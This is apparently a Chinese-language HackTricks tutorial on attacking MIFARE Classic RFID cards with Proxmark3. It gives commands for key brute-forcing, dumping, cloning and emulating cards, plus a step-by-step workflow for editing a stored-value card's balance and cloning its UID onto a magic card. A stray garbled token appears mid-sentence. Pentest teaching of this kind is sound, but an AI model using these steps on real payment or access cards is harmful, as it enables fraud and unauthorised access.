# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## 使用 Proxmark3 攻击 RFID 系统

安装持续维护的 RRG/Iceman Proxmark3 客户端及匹配的固件，然后根据该版本确认命令语法，因为下方列出的旧命令可能已更改。<sup>[[1]](#references)[[5]](#references)</sup>

### 攻击 MIFARE Classic 1KB

MIFARE Classic 1K 有 **16 个扇区**，每个扇区包含 **4 个块**，每块 **16 字节**。制造商块 0 包含 UID/制造商数据，在原装 NXP 卡上为只读；特殊克隆卡或“magic”卡可能允许重写该块。<sup>[[1]](#references)[[2]](#references)</sup>\
要访问每个扇区，需要 **2 个密钥**（**A** 和 **B**），它们存储在**每个扇区的块 3**（扇区尾块）中。扇区尾块还存储**访问位**，用于控制使用这 2 个密钥对**每个块**的**读写**权限。\
例如，如果知道第一个密钥，可以用它授予读取权限；如果知道第二个密钥，可以用它授予写入权限。

可以执行多种攻击urduň

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3 还可以执行其他操作，例如**窃听** **标签到读卡器的通信**，以尝试查找敏感数据。在这类卡片中，你只需 sniff 通信并计算所用的密钥，因为**使用的加密操作较弱**，只要知道明文和密文，就能计算出密钥（`mfkey64` 工具）。<sup>[[3]](#references)</sup>

#### MiFare Classic 储值滥用快速工作流

当终端将余额存储在 Classic 卡上时，典型的端到端流程如下：<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

备注

- `hf mf autopwn` 可编排 nested/darkside/HardNested 风格的攻击、恢复密钥，并在客户端的 dumps 文件夹中创建转储文件。<sup>[[1]](#references)</sup>
- 只有 magic gen1a/gen2 卡才能写入 block 0/UID。普通 Classic 卡的 UID 为只读。<sup>[[2]](#references)</sup>
- 许多部署使用 Classic“值块”或简单校验和。编辑后，请确保所有重复/取反字段和校验和保持一致。<sup>[[4]](#references)</sup>

更高层次的方法论和缓解措施，请参阅：

{{#ref}}
pentesting-rfid.md
{{#endref}}

### 原始命令

IoT 系统有时会使用**非品牌或非商业标签**。在这种情况下，你可以使用 Proxmark3 向**标签发送自定义原始命令**。

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

有了这些信息，你可以尝试搜索有关卡片以及如何与其通信的信息。Proxmark3 支持发送原始命令，例如：`hf 14a raw -p -b 7 26`

### 脚本

Proxmark3 软件预装了一组**自动化脚本**，可用于执行简单任务。要获取完整列表，请使用 `script list` 命令。接着，使用 `script run` 命令并在后面加上脚本名称：

```
proxmark3> script run mfkeys
```

你可以编写脚本来 **fuzz 标签读取器**：复制一张**有效卡**的数据，然后只需编写一个 **Lua 脚本**，随机修改一个或多个随机**字节**，并检查每次迭代时**读取器是否会崩溃**。

## References

- [1] [Proxmark3 wiki：HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki：HF Magic 卡](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP 关于 MIFARE Classic Crypto1 的声明](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value NFC 卡漏洞利用（SEC Consult）](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux 安装](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
